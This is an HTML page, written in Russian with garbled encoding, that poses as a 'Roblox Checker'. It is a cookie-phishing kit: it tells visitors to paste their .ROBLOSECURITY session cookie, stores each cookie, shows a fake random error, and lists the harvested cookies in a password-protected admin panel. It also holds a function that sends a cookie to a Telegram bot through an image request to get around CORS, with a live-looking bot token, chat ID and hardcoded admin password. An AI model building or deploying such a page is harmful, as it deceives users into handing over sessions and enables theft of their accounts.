<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Roblox Checker</title>
    <style>
        /* –ü—Ä–æ—Å—Ç—ã–µ —Å—Ç–∏–ª–∏ –∫–æ—Ç–æ—Ä—ã–µ —Ç–æ—á–Ω–æ —Ä–∞–±–æ—Ç–∞—é—Ç */
        body {
            background: #111;
            color: white;
            font-family: Arial;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            text-align: center;
        }
        h1 {
            color: #ff3333;
            margin: 20px 0;
        }
        textarea {
            width: 100%;
            height: 150px;
            padding: 15px;
            margin: 15px 0;
            background: #222;
            border: 2px solid #00aa00;
            color: white;
            border-radius: 5px;
            font-family: monospace;
            font-size: 14px;
        }
        button {
            padding: 12px 25px;
            background: #00aa00;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 5px;
        }
        button:hover {
            background: #00cc00;
        }
        .admin-btn {
            background: #3333ff;
        }
        .status {
            padding: 15px;
            margin: 20px 0;
            background: #222;
            border-radius: 5px;
            min-height: 50px;
        }
        .code-item {
            background: #222;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            text-align: left;
            border-left: 4px solid #00aa00;
        }
        .code-text {
            font-family: monospace;
            background: #111;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            word-break: break-all;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ -->
        <div id="mainPage">
            <h1>üîê Roblox Checker</h1>
            <p>–ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ Roblox</p>
            
            <div>
                <h3>üìã –í—Å—Ç–∞–≤—å—Ç–µ .ROBLOSECURITY –∫—É–∫–∏</h3>
                <p style="color: #aaa;">–ö–∞–∫ –ø–æ–ª—É—á–∏—Ç—å: F12 ‚Üí Application ‚Üí Cookies ‚Üí .ROBLOSECURITY</p>
                
                <textarea id="cookieInput" placeholder="–í—Å—Ç–∞–≤—å—Ç–µ —Å—é–¥–∞ –≤–∞—à –∫–æ–¥..."></textarea>
                
                <div>
                    <button onclick="sendCode()">üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∞–∫–∫–∞—É–Ω—Ç</button>
                    <button class="admin-btn" onclick="showAdmin()">üîß –ê–¥–º–∏–Ω–∫–∞</button>
                </div>
                
                <div class="status" id="status">–û–∂–∏–¥–∞–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏...</div>
            </div>
        </div>
        
        <!-- –ê–¥–º–∏–Ω–∫–∞ -->
        <div id="adminPage" style="display:none;">
            <h2>üìã –í—Å–µ –∫–æ–¥—ã</h2>
            
            <div>
                <button onclick="loadLocalCodes()">üîÑ –û–±–Ω–æ–≤–∏—Ç—å</button>
                <button onclick="clearLocalCodes()" style="background: #ff3333;">üóëÔ∏è –û—á–∏—Å—Ç–∏—Ç—å</button>
                <button onclick="showMain()">‚Üê –ù–∞–∑–∞–¥</button>
            </div>
            
            <div id="codesList" style="margin-top:20px;">
                <!-- –ö–æ–¥—ã –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è –∑–¥–µ—Å—å -->
            </div>
        </div>
    </div>

    <script>
        // –ù–∞—Å—Ç—Ä–æ–π–∫–∏
        const ADMIN_PASS = 'malik0609';
        
        // ====== –û–¢–ü–†–ê–í–ö–ê –ö–û–î–ê ======
        function sendCode() {
            const input = document.getElementById('cookieInput');
            const status = document.getElementById('status');
            const code = input.value.trim();
            
            if (!code) {
                status.innerHTML = '‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥';
                return;
            }
            
            status.innerHTML = '‚è≥ –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ...';
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage
            const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
            codes.unshift({
                code: code,
                time: new Date().toLocaleString('ru-RU'),
                length: code.length
            });
            localStorage.setItem('robloxCodes', JSON.stringify(codes));
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º "–æ—à–∏–±–∫—É"
            setTimeout(() => {
                const errors = [
                    '‚ùå –û—à–∏–±–∫–∞: –Ω–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫—É–∫–∏',
                    '‚ö†Ô∏è –ö—É–∫–∏ —É—Å—Ç–∞—Ä–µ–ª',
                    'üîí –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ 2FA –∑–∞—â–∏—Ç–∞'
                ];
                status.innerHTML = errors[Math.floor(Math.random() * errors.length)];
                input.value = '';
            }, 1000);
        }
        
        // ====== –ê–î–ú–ò–ù–ö–ê ======
        function showAdmin() {
            const password = prompt('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∫–∏:');
            if (password === ADMIN_PASS) {
                document.getElementById('mainPage').style.display = 'none';
                document.getElementById('adminPage').style.display = 'block';
                loadLocalCodes();
            } else {
                alert('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å!');
            }
        }
        
        function showMain() {
            document.getElementById('mainPage').style.display = 'block';
            document.getElementById('adminPage').style.display = 'none';
            document.getElementById('status').innerHTML = '–û–∂–∏–¥–∞–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏...';
        }
        
        function loadLocalCodes() {
            const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
            const container = document.getElementById('codesList');
            
            if (codes.length === 0) {
                container.innerHTML = '<div style="color:#aaa; padding:30px;">üì≠ –ö–æ–¥–æ–≤ –ø–æ–∫–∞ –Ω–µ—Ç</div>';
                return;
            }
            
            let html = '';
            codes.forEach((item, index) => {
                html += `
                    <div class="code-item">
                        <div style="color:#aaa; font-size:14px;">
                            –ö–æ–¥ #${index + 1} | ${item.time} | ${item.length} —Å–∏–º–≤–æ–ª–æ–≤
                        </div>
                        <div class="code-text">${item.code}</div>
                        <button onclick="copyCode('${item.code.replace(/'/g, "\\'")}')" 
                                style="background:#3333ff; padding:8px 15px; font-size:14px;">
                            üìã –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å
                        </button>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        function clearLocalCodes() {
            if (confirm('–£–¥–∞–ª–∏—Ç—å –≤—Å–µ –∫–æ–¥—ã?')) {
                localStorage.removeItem('robloxCodes');
                loadLocalCodes();
            }
        }
        
        // ====== –£–¢–ò–õ–ò–¢–´ ======
        function copyCode(text) {
            navigator.clipboard.writeText(text)
                .then(() => alert('‚úÖ –ö–æ–¥ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω!'))
                .catch(() => {
                    const textarea = document.createElement('textarea');
                    textarea.value = text;
                    document.body.appendChild(textarea);
                    textarea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textarea);
                    alert('‚úÖ –ö–æ–¥ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω!');
                });
        }
        
        // ====== –¢–ï–õ–ï–ì–†–ê–ú –û–¢–ü–†–ê–í–ö–ê (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ) ======
        function sendToTelegram(code) {
            const BOT_TOKEN = '8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8';
            const CHAT_ID = '1491315056';
            
            const message = `üîê –ù–æ–≤—ã–π –∫–æ–¥!\n\n${code}\n\n–î–ª–∏–Ω–∞: ${code.length} —Å–∏–º–≤–æ–ª–æ–≤`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ (–æ–±—Ö–æ–¥ CORS)
            const img = new Image();
            img.src = url;
        }
        
        // –ü—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = function() {
            console.log('‚úÖ –°–∞–π—Ç –∑–∞–≥—Ä—É–∂–µ–Ω');
            console.log('üîê –ü–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∫–∏:', ADMIN_PASS);
        };
    </script>
</body>
</html>
